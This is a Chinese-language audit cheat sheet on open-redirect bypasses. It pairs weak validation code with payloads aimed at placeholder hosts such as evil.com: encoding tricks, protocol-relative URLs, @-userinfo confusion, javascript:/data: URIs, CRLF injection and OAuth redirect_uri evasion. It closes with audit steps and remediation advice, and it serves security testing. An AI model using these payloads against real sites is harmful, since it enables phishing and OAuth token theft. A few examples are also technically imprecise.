# 开放重定向绕过技巧

本文档汇总常见的开放重定向防护机制绕过技巧，用于深度安全审计和漏洞验证。

---

## 1. 协议相关绕过

### 1.1 协议绕过技巧

**防护机制**：检查重定向URL的协议，只允许 `http://` 或 `https://`

```javascript
// 防护代码
if (!url.startsWith('http://') && !url.startsWith('https://')) {
    throw new Error('Invalid protocol');
}
```

**绕过技巧**：

#### 方式 1：大小写混合
```
原始被拦截：http://evil.com
绕过：HTTP://evil.com
      Http://evil.com
      hTTp://evil.com
```

#### 方式 2：协议的 Unicode 编码
```
原始：https://evil.com
绕过：ht\u0074ps://evil.com  (Unicode t)
      https\u003a//evil.com  (Unicode :)
      https:/\/evil.com  (斜杠编码)
```

#### 方式 3：使用相对协议
```
原始被拦截：http://evil.com
绕过：//evil.com  (浏览器使用当前协议)
```

#### 方式 4：协议加空格或特殊字符
```
原始被拦截：http://evil.com
绕过：http ://evil.com (空格)
      http%09://evil.com  (TAB)
      http%0a://evil.com  (换行)
```

---

## 2. 域名验证绕过

### 2.1 黑名单绕过

**防护机制**：使用域名黑名单检查

```php
// 防护代码
$blacklist = ['evil.com', 'malicious.com'];
foreach ($blacklist as $domain) {
    if (strpos($url, $domain) !== false) {
        throw new Error('Domain blocked');
    }
}
redirect($url);
```

**绕过技巧**：

#### 方式 1：子域名绕过
```
黑名单：evil.com
绕过：attacker.evil.com  (子域名通常不会被检查)
      evil.com.legit.com  (合法域名包含黑名单)
```

#### 方式 2：特殊子域名
```
黑名单：evil.com
绕过：@evil.com  (某些URL解析器忽略 @)
      evil.com@legit.com  (@ 前的部分被忽略)
      :evil.com  (冒号前可能被忽略)
```

#### 方式 3：IP 地址绕过
```
黑名单：evil.com
绕过：http://192.168.1.1  (使用 IP 地址)
      http://3232235777  (十进制 IP)
      http://0xc0a80101  (十六进制 IP)
```

#### 方式 4：DNS 重绑定
```
黑名单：evil.com
绕过：attacker.com (首次DNS查询返回 127.0.0.1，第二次返回恶意IP)
```

#### 方式 5：编码和拼接
```
黑名单：evil.com
绕过：ev%69l.com  (URL编码 i)
      e"vil".com  (某些解析器忽略引号)
      evil.c o m  (空格可能被忽略)
```

### 2.2 白名单绕过

**防护机制**：使用域名白名单检查

```javascript
// 防护代码
const whitelist = ['example.com', 'trusted.com'];
const urlDomain = new URL(url).hostname;
if (!whitelist.includes(urlDomain)) {
    throw new Error('Domain not whitelisted');
}
```

**绕过技巧**：

#### 方式 1：白名单作为子域名
```
白名单：example.com
绕过：evil.com.example.com  (example.com 作为子域名)
```

#### 方式 2：URL 解析器差异
```
白名单：example.com
绕过：example.com:@evil.com  (某些解析器认为是 example.com:@evil.com，其他认为是 evil.com)
      example.com#@evil.com  (片段标识符)
      example.com?@evil.com  (查询参数)
```

#### 方式 3：特殊字符绕过
```
白名单：example.com
绕过：example.com.\x00evil.com  (空字节)
      example.com%00evil.com  (编码空字节)
```

#### 方式 4：URL 规范化差异
```
白名单：example.com
绕过：example.com/../../evil.com  (路径遍历)
      example.com//evil.com  (双斜杠)
```

---

## 3. 路径和查询参数绕过

### 3.1 参数位置绕过

**防护机制**：检查特定参数中的重定向URL

```python
# 防护代码
def safe_redirect(url):
    if url.startswith('http://evil.com'):
        raise ValueError('Invalid URL')
    return redirect(url)

# 但可能有多个参数来源
redirect_url = request.args.get('redirect_url') or request.form.get('next')
```

**绕过技巧**：

#### 方式 1：参数覆盖
```
防护：检查 redirect_url 参数
绕过：使用 next 参数（如果未检查）
     /login?redirect_url=safe.com&next=evil.com
```

#### 方式 2：HTTP 头注入
```
防护：检查 GET/POST 参数
绕过：使用 Referer 或 X-Forwarded-For 头
     Header: X-Forwarded-For: evil.com
```

#### 方式 3：Cookie 中的参数
```
防护：检查 URL 参数
绕过：Set-Cookie: redirect_url=evil.com
```

---

## 4. 数据 URL 和 JavaScript 协议绕过

### 4.1 JavaScript 协议

**防护机制**：只检查特定的安全协议

```java
// 防护代码
if (url.startsWith("http://") || url.startsWith("https://")) {
    redirect(url);
}
```

**绕过技巧**：

#### 方式 1：JavaScript 协议
```
原始被拦截：http://evil.com
绕过：javascript:eval('document.location=alert("XSS")')
```

#### 方式 2：Data URL
```
绕过：data:text/html,<script>window.location='http://evil.com'</script>
```

#### 方式 3：VBScript 协议
```
绕过：vbscript:msgbox("alert")
```

#### 方式 4：SVG 中的 XLink
```
绕过：<svg onload="window.location='http://evil.com'"></svg>
```

---

## 5. 片段标识符和查询字符串绕过

### 5.1 片段标识符绕过

**防护机制**：检查 URL 的主机部分

```javascript
// 防护代码
const url = new URL(redirectUrl);
if (!url.hostname.endsWith('example.com')) {
    throw new Error('Invalid domain');
}
```

**绕过技巧**：

#### 方式 1：使用 # 作为 URL 分隔符
```
原始：example.com/page?target=evil.com
防护：检查查询参数的 target 值
绕过：example.com/page#evil.com  (# 后的内容不发送到服务器)
```

#### 方式 2：使用 ? 混淆
```
原始被拦截：evil.com
绕过：example.com?example.com?evil.com  (某些解析器只看第一个 ?)
```

#### 方式 3：编码的 # 和 ?
```
绕过：example.com%23evil.com  (%23 = #)
      example.com%3Fevil.com  (%3F = ?)
```

---

## 6. 开放重定向链

### 6.1 重定向链利用

**防护机制**：验证最终目标 URL

**绕过技巧**：

#### 方式 1：利用允许的中继网站
```
合法网站：site1.com (允许重定向到任何 URL)
绕过：redirect_to=http://site1.com?target=evil.com
     用户首先重定向到 site1.com，然后被 site1.com 重定向到 evil.com
```

#### 方式 2：OAuth/OIDC 重定向 URI 利用
```
防护：检查 redirect_uri 参数
绕过：使用 OAuth 流程中的注册 redirect_uri 来中继到恶意网站
     /oauth/authorize?client_id=xxx&redirect_uri=http://site1.com&state=evil.com
```

---

## 7. 编码绕过

### 7.1 多层编码

**防护机制**：简单的 URL 验证

```python
# 防护代码
if 'evil.com' in url:
    raise ValueError('Blocked')
```

**绕过技巧**：

#### 方式 1：URL 编码
```
原始被拦截：http://evil.com
绕过：http%3a%2f%2fevil.com  (完整编码)
      http://e%76il.com  (部分编码)
```

#### 方式 2：Unicode 编码
```
绕过：http://ev\u0069l.com  (Unicode i)
      http://\u0065vil.com  (Unicode e)
```

#### 方式 3：HTML 实体编码
```
绕过：http://&#101;vil.com  (&#101; = e)
      http://evil&#46;com  (&#46; = .)
```

#### 方式 4：二次编码
```
原始被拦截：http://evil.com
一次编码：http%3a%2f%2fevil.com
二次编码：http%253a%252f%252fevil.com
```

#### 方式 5：混合编码
```
绕过：http://e%76il.com (混合编码和原文)
      http://evil%2ecom  (部分编码)
```

---

## 8. null 字节和特殊字符绕过

### 8.1 null 字节注入

**防护机制**：字符串匹配检查

```php
// 防护代码
if (strpos($url, 'evil.com') !== false) {
    throw new Error('Blocked');
}
```

**绕过技巧**：

#### 方式 1：Null 字节 (PHP < 5.3.4)
```
原始被拦截：evil.com
绕过：safe.com%00evil.com  (null 字节截断)
```

#### 方式 2：特殊字符分隔
```
绕过：safe.com\x0bevil.com  (垂直制表符)
      safe.com\x0devil.com  (回车)
```

---

## 9. 相对 URL 和路径遍历

### 9.1 相对 URL 绕过

**防护机制**：只允许绝对 URL

```javascript
// 防护代码
if (!url.startsWith('http://') && !url.startsWith('https://')) {
    throw new Error('Must be absolute URL');
}
```

**绕过技巧**：

#### 方式 1：使用相对协议
```
绕过：//evil.com  (浏览器自动补全协议)
```

#### 方式 2：使用相对路径
```
绕过：/../../evil.com  (但需要特定解析方式)
      ./evil.com
```

#### 方式 3：使用 @ 符号
```
原始被拦截：http://evil.com
绕过：http://user:pass@evil.com/
      http://safe.com@evil.com/  (@ 前的部分可能被忽略)
```

---

## 10. 浏览器行为利用

### 10.1 浏览器解析差异

**防护机制**：严格的 URL 验证

**绕过技巧**：

#### 方式 1：空格和特殊字符
```
绕过：http://evil.com (带尾部空格)
      http://evil.com\t (制表符)
```

#### 方式 2：IP 地址变体
```
原始被拦截：http://evil.com
绕过：http://2130706433  (127.0.0.1 的十进制)
      http://0x7f000001  (127.0.0.1 的十六进制)
      http://0177.0000.0000.0001  (八进制)
```

#### 方式 3：IPv6 地址
```
绕过：http://[::1]  (localhost)
      http://[::ffff:127.0.0.1]  (IPv4-mapped IPv6)
```

#### 方式 4：CRLF 注入
```
绕过：http://evil.com%0d%0aSet-Cookie: admin=true
      (注入额外的 HTTP 头)
```

---

## 11. OAuth 和 OIDC 特定绕过

### 11.1 Redirect URI 验证绕过

**防护机制**：验证 OAuth redirect_uri

```javascript
// 防护代码
if (!REDIRECT_URIS.includes(redirectUri)) {
    throw new Error('Invalid redirect URI');
}
```

**绕过技巧**：

#### 方式 1：Subdomain 绕过
```
注册：https://example.com/callback
绕过：https://attacker.example.com/callback
```

#### 方式 2：末尾斜杠差异
```
注册：https://example.com/callback
绕过：https://example.com/callback/
      https://example.com/callback?param=value
```

#### 方式 3：@符号利用
```
注册：https://example.com/callback
绕过：https://attacker.com@example.com/callback
```

#### 方式 4：Fragment 利用
```
注册：https://example.com/callback
绕过：https://example.com/callback#attacker.com
```

#### 方式 5：路径穿越
```
注册：https://example.com/callback
绕过：https://example.com/callback/../../evil.com
```

---

## 12. 框架特定绕过

### 12.1 Spring Security 绕过

```java
// 防护：看似安全的白名单
List<String> allowedRedirects = Arrays.asList(
    "http://example.com/",
    "http://trusted.com/"
);

// 绕过：使用 // 协议相对 URL
redirectUrl = "//evil.com/"
```

### 12.2 Laravel 绕过

```php
// 防护代码
redirect()->to(Input::get('return_url'));

// 绕过：Protocol-relative URL
return_url = //evil.com/
```

### 12.3 Express.js 绕过

```javascript
// 防护代码
res.redirect(req.query.next);

// 绕过：使用 // 或编码
next = //evil.com
next = %2f%2fevil.com
```

---

## 13. 防护机制检查清单

在进行安全审计时，检查以下防护机制：

| 防护机制 | 绕过难度 | 常见绕过方式 |
|---------|---------|----------|
| 协议检查 | 低 | 大小写混合、相对协议、编码 |
| 域名黑名单 | 低 | 子域名、IP 地址、编码 |
| 域名白名单 | 中 | 子域名包含、URL 解析差异 |
| 简单字符检查 | 低 | 编码、Null 字节、特殊字符 |
| URL 解析验证 | 中 | 浏览器差异、特殊字符、编码 |
| OAuth redirect_uri | 中 | 子域名、末尾字符、@ 符号 |
| Framework 内置 | 中-高 | 框架特定的处理方式 |

---

## 14. 审计建议

### 高风险指标
- 直接使用用户输入进行重定向
- 验证基于黑名单而非白名单
- 缺少对相对协议 (`//`) 的检查
- URL 解析不一致
- OAuth redirect_uri 验证不完整

### 审计步骤
1. **定位重定向代码**：搜索 `redirect`、`location` 等关键词
2. **追踪参数来源**：确认重定向 URL 来自用户输入
3. **验证防护机制**：评估当前的验证逻辑
4. **尝试绕过**：使用本文档中的技巧验证防护的鲁棒性
5. **测试多层验证**：检查是否有多个验证层
6. **生成报告**：记录所有发现的开放重定向漏洞

### 验证修复
修复开放重定向漏洞时，确保：
- 使用白名单而非黑名单验证重定向目标
- 使用标准库的 URL 验证函数（如 `URL` 类）
- 检查绝对协议 (`http://` 或 `https://`)，不接受 `//` 或相对 URL
- 验证完整的域名，不仅仅是包含关系
- 对 OAuth/OIDC 实现完整的 redirect_uri 验证
- 定期进行安全审计和测试
